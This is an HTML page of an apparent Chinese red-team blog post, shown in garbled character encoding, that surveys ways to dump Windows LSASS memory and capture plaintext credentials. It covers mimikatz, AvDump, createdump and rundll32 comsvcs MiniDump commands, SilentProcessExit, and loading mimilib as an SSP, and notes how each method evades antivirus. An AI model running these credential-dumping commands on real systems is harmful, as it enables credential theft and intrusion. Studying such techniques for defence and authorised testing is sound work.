<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ğŸ³æ¯…ç§å¾ªç¯</title>
<meta name="description" content="</br>è¥¿éƒŠæœ‰å¯†æ—ï¼ŒåŠ©å›å‡ºé‡å›´ã€‚</br>
</br># WhoAmI</br>
</br># æ¯…ç§å¾ªç¯</br>" />
<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico?v=1668483625774">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">

<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-226932280-1');
</script>


  </head>
  <body>
    <div id="app" class="main px-4 flex flex-col lg:flex-row">
      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
  <div class="lg:sticky top-0">
    <div class="sidebar-content">
      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
        <a href="https://redteamblog.icu">
          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://redteamblog.icu/images/avatar.png?v=1668483625774" alt="">
        </a>
        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">ğŸ³æ¯…ç§å¾ªç¯</h1>
      </div>
      
        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
          <p class="my-4 text-gray-600 font-light hidden lg:block">
            æ–‡ç« ç›®å½•
          </p>
          <div class="toc-container hidden lg:block">
            <ul class="markdownIt-TOC">
<li><a href="#%E4%B8%80%E4%BA%9B%E8%8E%B7%E5%8F%96windows%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE%E7%9A%84%E6%96%B9%E6%B3%95">ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•</a>
<ul>
<li><a href="#0x00-%E6%96%B9%E6%B3%95">0x00 æ–¹æ³•</a>
<ul>
<li><a href="#1-mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96lsass">1. Mimikatzç›´æ¥è¯»å–Lsass</a></li>
<li><a href="#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dump">2. ç­¾å/ç™½åå•æ–‡ä»¶Dump</a></li>
<li><a href="#1-avdumpexe">(1) AvDump.exe</a></li>
<li><a href="#2-createdumpexe">(2) CreateDump.exe</a></li>
<li><a href="#3-rundll32exe">(3) Rundll32.exe</a></li>
<li><a href="#3-%E5%88%A9%E7%94%A8silentprocessexit%E8%BF%9B%E8%A1%8Cdump">3. åˆ©ç”¨SilentProcessExitè¿›è¡ŒDump</a></li>
<li><a href="#4-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84ssp">4. æ·»åŠ è‡ªå®šä¹‰çš„SSP</a></li>
<li><a href="#1-%E4%BD%BF%E7%94%A8memssp%E5%AF%B9lsass%E8%BF%9B%E8%A1%8Cpatch">(1) ä½¿ç”¨MemSSPå¯¹lsassè¿›è¡Œpatch</a></li>
<li><a href="#2-%E4%BD%BF%E7%94%A8addsecuritypackage%E5%8A%A0%E8%BD%BDssp">(2) ä½¿ç”¨AddSecurityPackageåŠ è½½SSP</a></li>
<li><a href="#3-%E9%80%9A%E8%BF%87rpc%E5%8A%A0%E8%BD%BDssp">(3) é€šè¿‡RPCåŠ è½½SSP</a></li>
</ul>
</li>
<li><a href="#0x01-%E5%AE%9E%E7%8E%B0">0x01 å®ç°</a>
<ul>
<li><a href="#1-%E7%BC%96%E5%86%99dump-lsass%E7%9A%84dll">1. ç¼–å†™Dump Lsassçš„DLL</a></li>
<li><a href="#2-%E5%B0%86dll%E4%B8%8Eexe%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85">2. å°†DLLä¸EXEæ–‡ä»¶æ‰“åŒ…</a></li>
<li><a href="#3-%E5%B0%86%E8%BF%9B%E7%A8%8Bdump%E5%88%B0%E5%86%85%E5%AD%98">3. å°†è¿›ç¨‹dumpåˆ°å†…å­˜</a></li>
<li><a href="#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp">4. x86ç¯å¢ƒä¸‹åˆ©ç”¨RPCåŠ è½½SSP</a></li>
<li><a href="#5-%E5%85%B6%E5%AE%83%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF">5. å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯</a></li>
</ul>
</li>
<li><a href="#0x02-%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">0x02 å¯èƒ½é‡åˆ°çš„é—®é¢˜</a>
<ul>
<li><a href="#1-%E7%BC%BA%E5%B0%91vc%E8%BF%90%E8%A1%8C%E5%BA%93">1. ç¼ºå°‘VCè¿è¡Œåº“</a></li>
<li><a href="#2-dump%E6%96%87%E4%BB%B6%E4%BD%93%E7%A7%AF%E8%BF%87%E5%A4%A7">2. dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§</a></li>
</ul>
</li>
<li><a href="#0x03-%E6%80%BB%E7%BB%93">0x03 æ€»ç»“</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      
    </div>
  </div>
</div>

<div class="menu-container">
  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
  <div>
    
      
        <a href="/" class="menu" style="animation-delay: 0s">
          ğŸ˜€é¦–é¡µ
        </a>
      
    
      
        <a href="/posts" class="menu" style="animation-delay: 0.2s">
          ğŸ¦‰æ–‡ç« åˆ—è¡¨
        </a>
      
    
      
        <a href="/archives" class="menu" style="animation-delay: 0.4s">
          ğŸ¤¿å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu" style="animation-delay: 0.6000000000000001s">
          ğŸ„â€â™€ï¸æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu" style="animation-delay: 0.8s">
          ğŸ‘¹å…³äº
        </a>
      
    
      
        <a href="links/" class="menu" style="animation-delay: 1s">
          å‹æƒ…é“¾æ¥
        </a>
      
    
      
        <a href="/tag/wQ9CEdhmu" class="menu" style="animation-delay: 1.2000000000000002s">
          ğŸŒ¿éšç¬”
        </a>
      
    
  </div>
  <div class="site-footer">
    <div class="py-4 text-gray-700"></div>
    <a class="rss" href="https://redteamblog.icu/atom.xml" target="_blank">RSS</a>
  </div>
</div>
<div class="mask" onclick="closeMenu()">
</div>
      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
        <h1 class="text-3xl font-bold lg:mt-16">ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•</h1>
        <div class="text-sm text-gray-700 lg:my-8">
          2022-04-29 / 14 min read
        </div>
        
          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://api.ixiaowai.cn/api/api.php?=1" alt="">
        
        <div class="post-content yue">
          <h1 id="ä¸€äº›è·å–windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•">ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•</h1>
<ul>
<li><a href="https://loong716.top/posts/lsass/#0x00-%E6%96%B9%E6%B3%95">0x00 æ–¹æ³•</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96lsass">1. Mimikatzç›´æ¥è¯»å–Lsass</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dump">2. ç­¾å/ç™½åå•æ–‡ä»¶Dump</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-avdumpexe">(1) AvDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-createdumpexe">(2) CreateDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-rundll32exe">(3) Rundll32.exe</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%88%A9%E7%94%A8silentprocessexit%E8%BF%9B%E8%A1%8Cdump">3. åˆ©ç”¨SilentProcessExitè¿›è¡ŒDump</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84ssp">4. æ·»åŠ è‡ªå®šä¹‰çš„SSP</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E4%BD%BF%E7%94%A8memssp%E5%AF%B9lsass%E8%BF%9B%E8%A1%8Cpatch">(1) ä½¿ç”¨MemSSPå¯¹lsassè¿›è¡Œpatch</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E4%BD%BF%E7%94%A8addsecuritypackage%E5%8A%A0%E8%BD%BDssp">(2) ä½¿ç”¨AddSecurityPackageåŠ è½½SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E9%80%9A%E8%BF%87rpc%E5%8A%A0%E8%BD%BDssp">(3) é€šè¿‡RPCåŠ è½½SSP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x01-%E5%AE%9E%E7%8E%B0">0x01 å®ç°</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%96%E5%86%99dump-lsass%E7%9A%84dll">1. ç¼–å†™Dump Lsassçš„DLL</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E5%B0%86dll%E4%B8%8Eexe%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85">2. å°†DLLä¸EXEæ–‡ä»¶æ‰“åŒ…</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%B0%86%E8%BF%9B%E7%A8%8Bdump%E5%88%B0%E5%86%85%E5%AD%98">3. å°†è¿›ç¨‹dumpåˆ°å†…å­˜</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp">4. x86ç¯å¢ƒä¸‹åˆ©ç”¨RPCåŠ è½½SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#5-%E5%85%B6%E5%AE%83%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF">5. å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x02-%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">0x02 å¯èƒ½é‡åˆ°çš„é—®é¢˜</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%BA%E5%B0%91vc%E8%BF%90%E8%A1%8C%E5%BA%93">1. ç¼ºå°‘VCè¿è¡Œåº“</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-dump%E6%96%87%E4%BB%B6%E4%BD%93%E7%A7%AF%E8%BF%87%E5%A4%A7">2. dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x03-%E6%80%BB%E7%BB%93">0x03 æ€»ç»“</a></li>
</ul>
<p>è·å–Windowsç”¨æˆ·çš„å‡­è¯ä¿¡æ¯æ˜¯æ¸—é€è¿‡ç¨‹ä¸­è‡³å…³é‡è¦çš„ä¸€æ­¥ï¼Œä¸æ€è½¯çš„å¯¹æŠ—ä¹Ÿåœ¨ä¸æ–­å‡çº§</p>
<p>æœ¬æ–‡å¯¹å¸¸è§çš„Dump Lsass/è·å–æ˜æ–‡å‡­æ®çš„æ–¹æ³•è¿›è¡Œç®€å•çš„æ€»ç»“ï¼Œä»¥åº”å¯¹å®æˆ˜ä¸­å„ç§å„æ ·çš„åœºæ™¯</p>
<h2 id="0x00-æ–¹æ³•">0x00 æ–¹æ³•</h2>
<h3 id="1-mimikatzç›´æ¥è¯»å–lsass">1. Mimikatzç›´æ¥è¯»å–Lsass</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ–¹ä¾¿å¿«æ·</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>mimikatzå¿…é¡»å…æ€</li>
<li>æ— æ³•ç»•è¿‡éƒ¨åˆ†AVå¯¹lsassçš„ç›‘æ§</li>
</ul>
</blockquote>
<p>ç»å…¸å§¿åŠ¿ï¼Œä½¿ç”¨mimikatzçš„<code>sekurlsa::logonpasswords</code></p>
<p>å…¶å®æ˜¯è°ƒç”¨<code>ReadProcessMemory</code>æ¥å°†lsassè¿›ç¨‹è¯»å…¥å†…å­˜ä¸­çš„å¦ä¸€ä¸ªåœ°å€ä¸­ï¼Œç„¶åå¯¹è¿›ç¨‹è¿›è¡Œè§£æï¼š</p>
<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" alt="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" loading="lazy"></figure>
<h3 id="2-ç­¾åç™½åå•æ–‡ä»¶dump">2. ç­¾å/ç™½åå•æ–‡ä»¶Dump</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç¨‹åºæ‹¥æœ‰åˆæ³•ç­¾å</li>
<li>è¿œç¨‹Dumpåä¸‹è½½åˆ°æœ¬åœ°ç¦»çº¿è§£æï¼Œå‡å°‘ç‰¹å¾</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>è™½ç„¶æœ‰ç­¾åä½†éƒ¨åˆ†AVä»ä¼šå‘å‡ºè­¦å‘Š</li>
<li>æ— æ³•ç»•è¿‡éƒ¨åˆ†AVå¯¹lsassçš„ç›‘æ§</li>
<li>dumpå¾—åˆ°çš„å†…å­˜è½¬å‚¨æ–‡ä»¶å¯èƒ½è§¦å‘æŠ¥è­¦</li>
</ul>
</blockquote>
<p>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªç¨‹åºï¼š</p>
<ol>
<li>Procdump.exe</li>
<li>SqlDumper.exe</li>
<li>AvDump.exe</li>
<li>createdump.exe</li>
<li>rundll32.exe</li>
</ol>
<p>å…¶ä¸­1ã€2ã€4è¿™ä¸‰ä¸ªå·¥å…·æ˜¯æœ‰å¾®è½¯ç­¾åçš„ï¼Œ3æ˜¯æœ‰æ€è½¯å‚å•†Avastçš„ç­¾åï¼Œrundll32è¿™ä¸ªLOLBINå°±ä¸ç”¨è¯´äº†</p>
<p>å‰ä¸¤ä¸ªå·¥å…·çš„ç”¨æ³•å·²ç»æ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ–‡ç« ï¼Œä¸»è¦è®¨è®ºåä¸‰ä¸ª</p>
<p>**PSï¼š**æ³¨æ„ä½¿ç”¨è¿™äº›å·¥å…·çš„æ—¶å€™æœ€å¥½æ˜¯systemæƒé™ï¼Œå¦‚æœæ˜¯administratorçš„è¯è¦æ³¨æ„æ˜¯å¦æœ‰<code>SeDebugPrivilege</code>ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¯ä»¥åœ¨å‘½ä»¤å‰ä½¿ç”¨<code>powershell -c</code></p>
<h3 id="1-avdumpexe">(1) AvDump.exe</h3>
<p>AvDump.exeæ˜¯æ€è½¯Avastè‡ªå¸¦çš„ä¸€ä¸ªç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä»¥ç”¨æ¥dumpè¿›ç¨‹çš„å†…å­˜ï¼Œæ‹¥æœ‰Avastçš„ç­¾å</p>
<pre><code>.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" alt="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" loading="lazy"></figure>
<h3 id="2-createdumpexe">(2) CreateDump.exe</h3>
<blockquote>
<p>createdump.exeéšç€.NET5å‡ºç°çš„ï¼Œæœ¬èº«æ˜¯ä¸ªnative binary</p>
</blockquote>
<p>è™½ç„¶createdump.exeæ˜¯éšç€.NET5å‡ºç°çš„ï¼Œä½†å› ä¸ºå®ƒæ˜¯native binaryï¼Œæ‰€ä»¥æ‰§è¡Œæ—¶å¹¶ä¸éœ€è¦ä¾èµ–.NET5çš„ç¯å¢ƒ</p>
<pre><code>createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;

</code></pre>
<h3 id="3-rundll32exe">(3) Rundll32.exe</h3>
<p>å…¶å®å°±æ˜¯ä½¿ç”¨rundll32ç›´æ¥æ‰§è¡Œcomsvcs.dllçš„å¯¼å‡ºå‡½æ•°<code>MiniDump</code>æ¥Dumpè¿›ç¨‹å†…å­˜</p>
<pre><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\admin\Desktop\lsass-comsvcs.dmp full

</code></pre>
<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" alt="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" loading="lazy"></figure>
<h3 id="3-åˆ©ç”¨silentprocessexitè¿›è¡Œdump">3. åˆ©ç”¨SilentProcessExitè¿›è¡ŒDump</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç³»ç»Ÿæ­£å¸¸è¡Œä¸º</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å†™æ³¨å†Œè¡¨</li>
</ul>
</blockquote>
<p>å¾ˆä¹…ä¹‹å‰çœ‹åˆ°è¿‡è®©ç³»ç»Ÿè“å±ï¼Œç„¶åé€šè¿‡windbgè°ƒè¯•ç³»ç»Ÿå´©æºƒæ–‡ä»¶æ¥è¯»å–lsassè¿›ç¨‹ï¼Œä½†ä¸ªäººæ„Ÿè§‰è¿™ç§æ–¹æ³•é£é™©è¿‡å¤§ï¼Œå¹¶ä¸”äº§ç”Ÿçš„å´©æºƒæ–‡ä»¶çš„ä½“ç§¯éå¸¸å¤§ï¼Œåœ¨å®æˆ˜ä¸­çš„åº”ç”¨æƒ…å†µæœ‰é™</p>
<p>ç›´åˆ°ä¸ä¹…å‰çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« ä½¿ç”¨SilentProcessExitæ¥ä½¿lsassé™é»˜é€€å‡ºï¼Œè¿›è€Œdumpè¿›ç¨‹å†…å­˜çš„æ–¹æ³•ï¼Œå…·ä½“åŸç†å¯ä»¥çœ‹æ–‡ç« ï¼š</p>
<p><a href="https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w">åˆ©ç”¨SilentProcessExitæœºåˆ¶dumpå†…å­˜</a></p>
<blockquote>
<p>Silent Process Exitï¼Œå³é™é»˜é€€å‡ºã€‚è€Œè¿™ç§è°ƒè¯•æŠ€æœ¯ï¼Œå¯ä»¥æ´¾ç”Ÿ werfault.exeè¿›ç¨‹ï¼Œå¯ä»¥ç”¨æ¥è¿è¡Œä»»æ„ç¨‹åºæˆ–è€…ä¹Ÿå¯ä»¥ç”¨æ¥è½¬å­˜ä»»æ„è¿›ç¨‹çš„å†…å­˜æ–‡ä»¶æˆ–å¼¹å‡ºçª—å£ã€‚</p>
</blockquote>
<p>å®é™…æµ‹è¯•ä¸­ï¼Œè¯¥æ–¹æ³•ç¡®å®å¯ä»¥dump lsassçš„è¿›ç¨‹å†…å­˜</p>
<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" alt="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" loading="lazy"></figure>
<p>ä½†åœ¨å¡å·´æ–¯åŸºç¯å¢ƒä¸‹ï¼Œä¸ä¼šæŠ¥è­¦ä½†dumpæ–‡ä»¶ä¸º0kb(çŒœæµ‹æ˜¯å¡å·´æ‹’ç»ç³»ç»Ÿè¡Œä¸ºè½¬å‚¨lsassè¿›ç¨‹)</p>
<p>è€Œé‡åˆ°defender+360çš„æƒ…å†µä¸‹ï¼ŒåŒæ ·ä¸ä¼šè§¦å‘æŠ¥è­¦ï¼Œä½†è¯¥ç¨‹åºæ— æ³•ä¿®æ”¹æ³¨å†Œè¡¨é¡¹</p>
<h3 id="4-æ·»åŠ è‡ªå®šä¹‰çš„ssp">4. æ·»åŠ è‡ªå®šä¹‰çš„SSP</h3>
<h3 id="1-ä½¿ç”¨memsspå¯¹lsassè¿›è¡Œpatch">(1) ä½¿ç”¨MemSSPå¯¹lsassè¿›è¡Œpatch</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
<li>Lsassè¿›ç¨‹ä¸­ä¸ä¼šå‡ºç°å¯ç–‘çš„DLL</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦è°ƒç”¨WriteProcessMemoryå¯¹lsassè¿›è¡Œæ“ä½œï¼Œå¯èƒ½ä¼šè¢«æ ‡è®°</li>
</ul>
</blockquote>
<p>è¯¥æ–¹æ³•çš„å¤§æ¦‚åŸç†æ˜¯ï¼Œé€šè¿‡æ‰“å¼€lsassè¿›ç¨‹çš„å¥æŸ„ï¼Œç„¶åæœç´¢<code>msv1_0.dll</code>ï¼ˆæ”¯æŒäº¤äº’å¼èº«ä»½éªŒè¯çš„DLLï¼‰ï¼Œæ‰¾åˆ°ä¹‹åå¯¹å…¶ä¸­çš„<code>SpAcceptCredentials</code>å‡½æ•°è¿›è¡Œhookï¼Œå½“ç”¨æˆ·è¿›è¡Œè®¤è¯æ—¶åœ¨<code>SpAcceptCredentials</code>å‡½æ•°ç¬¬ä¸€è¡Œä¼šé¦–å…ˆ<code>jmp</code>åˆ°æˆ‘ä»¬çš„å‡½æ•°ï¼Œå°†å‡­è¯å†™å…¥æ–‡ä»¶åå†è·³å›åŸå‡½æ•°</p>
<p>å½“æˆ‘ä»¬æ‰§è¡Œåï¼Œå°è¯•ç”¨æˆ·èº«ä»½è®¤è¯ï¼Œå¯ä»¥çœ‹åˆ°å¯†ç è¢«è®°å½•åœ¨mimilsa.txtä¸­ï¼š</p>
<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" alt="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" loading="lazy"></figure>
<p>lsassçš„è¿›ç¨‹ä¸­å¹¶ä¸å­˜åœ¨å¼‚å¸¸çš„DLLï¼š</p>
<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" alt="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" loading="lazy"></figure>
<h3 id="2-ä½¿ç”¨addsecuritypackageåŠ è½½ssp">(2) ä½¿ç”¨AddSecurityPackageåŠ è½½SSP</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥ç»•è¿‡éƒ¨åˆ†æ€è½¯å¯¹lsassçš„ç›‘æ§</li>
<li>å¯ä»¥åŠ è½½mimilibæ¥è®°å½•å¯†ç ä»¥åº”å¯¹ç‰ˆæœ¬å¤§äºç­‰äºWindows Server 2012çš„æƒ…å†µ</li>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å†™æ³¨å†Œè¡¨</li>
<li>éœ€è¦å°†SSPçš„dllæ‹·è´åˆ°system32ä¸‹ï¼ˆè¿™ä¸ªè¯´ç¼ºç‚¹ä¼¼ä¹ä¹Ÿè°ˆä¸ä¸Šï¼‰</li>
<li>Blue Teamå¯ä»¥é€šè¿‡æšä¸¾SSPæ¥å‘ç°æˆ‘ä»¬è‡ªå®šä¹‰çš„SSPï¼Œå¹¶ä¸”lsassè¿›ç¨‹ä¸­å¯ä»¥çœ‹åˆ°åŠ è½½çš„DLL</li>
</ul>
</blockquote>
<p>SSPå’ŒSSPIçš„çŸ¥è¯†å°±ä¸è°ˆäº†ï¼Œæ·»åŠ SSPéœ€è¦ä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>å°†mimilib.dllå¤åˆ¶åˆ°<code>c:\windows\system32</code>ä¸‹</li>
<li>å°†<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code>å¤„Security Packagesçš„å€¼è®¾ç½®ä¸ºmimilib.dll</li>
<li>è°ƒç”¨<code>AddSecurityPackage</code>æ·»åŠ SSP</li>
</ol>
<p>ç›¸å…³ä»£ç å¯ä»¥å‚è€ƒï¼š<a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/CredSSP/CredSSP/CredSSP.cpp">CredSSP</a></p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨**@lengyi**å¸ˆå‚…çš„ä»£ç ï¼Œè¿è¡Œåä¼šå°†å­˜æ”¾åœ¨èµ„æºåŒºçš„mimilib.dllé‡Šæ”¾åˆ°å½“å‰ç›®å½•ï¼Œç„¶åç§»åŠ¨åˆ°system32ä¸‹ï¼Œä¿®æ”¹æ³¨å†Œè¡¨ï¼Œæœ€ç»ˆè°ƒç”¨<code>AddSecurityPackage</code>æ·»åŠ sspï¼š</p>
<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" alt="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" loading="lazy"></figure>
<p>å¯ä»¥çœ‹åˆ°lsassè¿›ç¨‹åŠ è½½äº†mimilib.dllï¼š</p>
<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" alt="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" loading="lazy"></figure>
<h3 id="3-é€šè¿‡rpcåŠ è½½ssp">(3) é€šè¿‡RPCåŠ è½½SSP</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥ç»•è¿‡æ€è½¯å¯¹lsassçš„ç›‘æ§</li>
<li>å¯ä»¥åŠ è½½mimilibæ¥è®°å½•å¯†ç ä»¥åº”å¯¹ç‰ˆæœ¬å¤§äºç­‰äºWindows Server 2012çš„æƒ…å†µ</li>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
<li>ä¸éœ€è¦å†™æ³¨å†Œè¡¨</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å› ä¸ºæ²¡æœ‰å†™æ³¨å†Œè¡¨ï¼Œæ‰€ä»¥æ— æ³•æŒä¹…åŒ–ï¼Œå¦‚æœç›®æ ‡æœºå™¨é‡å¯çš„è¯å°†æ— æ³•è®°å½•å¯†ç ï¼ˆå› æ­¤ä¸ªäººè®¤ä¸ºæ¯”è¾ƒé€‚åˆåœ¨Serverä¸Šç”¨ï¼Œä¸é€‚åˆåœ¨PCä¸Šç”¨ï¼‰</li>
</ul>
</blockquote>
<p>å¯ä»¥å‚è€ƒxpnå…³äºmimikatzçš„ç³»åˆ—æ–‡ç« ï¼š</p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">exploring-mimikatz-part-1</a></p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">exploring-mimikatz-part-2</a></p>
<p>åŸç†ç®€å•çš„æ¥è®²å°±æ˜¯ï¼Œxpnå‘ç°<code>AddSecurityPackage()</code>åœ¨è¢«è°ƒç”¨æ—¶ä¼šä½¿ç”¨RPCï¼ˆxpnçš„åŸæ–‡ä¸­è¯´åˆ°ï¼šè¿™æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºè¿™ä¸€è°ƒç”¨éœ€è¦å‘lsasså‘å‡ºä¿¡å·æ¥è¡¨æ˜éœ€è¦åŠ è½½æ–°çš„SSPï¼‰</p>
<p>å› æ­¤å¯ä»¥é€šè¿‡è°ƒè¯•è·å–ä¼ é€’ç»™RPCçš„æ•°æ®ï¼Œè¿›è€Œå¯ä»¥å‘èµ·RPCè°ƒç”¨ï¼Œè€Œä¸ç”¨ä½¿ç”¨<code>AddSecurityPackage()</code>è¿™ä¸ªAPIå»è°ƒç”¨</p>
<p>åŠ è½½çš„dllå¯ä»¥æ˜¯ç›´æ¥dump lsassçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŠ è½½mimilibè¿™ç§è®°å½•å¯†ç çš„</p>
